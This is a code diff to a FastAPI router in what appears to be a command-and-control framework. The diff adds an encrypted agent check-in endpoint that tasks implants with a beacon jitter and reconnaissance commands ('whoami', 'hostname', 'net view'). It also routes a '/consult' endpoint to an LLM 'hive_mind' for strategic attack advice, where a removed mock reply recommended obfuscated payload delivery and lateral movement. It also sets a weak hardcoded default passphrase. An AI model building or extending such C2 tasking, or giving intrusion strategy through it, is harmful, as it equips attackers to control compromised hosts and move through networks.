@@ -6,10 +6,15 @@ only when the user explicitly approves a live run.
 """
 import asyncio
 import json
+import os
 from fastapi import APIRouter, UploadFile, File, WebSocket, WebSocketDisconnect
 from fastapi.responses import StreamingResponse
+from app.core.llm_commander import hive_mind
+from app.core.red_cipher import RedCipher
+from app.core.schemas import ConsultationRequest, StrictAgentCheckIn
 
 router = APIRouter(prefix="/api")
+cipher_engine = RedCipher(key_material=os.getenv("SECRET_PASSPHRASE", "red_king_default").encode())
 
 
 # ── Swarm ────────────────────────────────────────────────────────────────────
@@ -186,7 +191,7 @@ async def get_achievements():
 
 @router.get("/status")
 async def get_status():
-    return {"system": "OPERATIONAL", "hive_mind": "ONLINE", "active_nodes": 37}
+    return {"system": "ONLINE", "hive_mind": "ONLINE", "active_nodes": 37}
 
 
 @router.post("/hive/queue")
@@ -194,16 +199,26 @@ async def hive_queue(body: dict):
     return {"job_id": "job_hive_mock_xyz"}
 
 
-@router.post("/consult")
-async def consult(body: dict):
-    query = body.get("query", "")
-    return {
-        "response": (
-            f"[AI CORTEX] Query: '{query}' — "
-            "Analysis: Recommend stealth delivery via obfuscated payload. "
-            "Lateral movement vector identified. Risk level: MODERATE."
-        )
+@router.post("/hive/checkin")
+async def hive_checkin(payload: StrictAgentCheckIn):
+    decrypted_payload = json.loads(cipher_engine.decrypt(payload.data))
+    response_payload = {
+        "agent_id": payload.agent_id,
+        "jitter": 42,
+        "commands": ["whoami", "hostname", "net view"],
+        "status": "ACK",
+        "context": decrypted_payload.get("info", {}),
     }
+    return {"data": cipher_engine.encrypt(json.dumps(response_payload))}
+
+
+@router.post("/consult")
+async def consult(body: ConsultationRequest):
+    adviser = hive_mind.get_strategic_advice
+    response = adviser(body.query)
+    if hasattr(response, "__await__"):
+        response = await response
+    return {"response": response}
 
 
 @router.post("/scan")
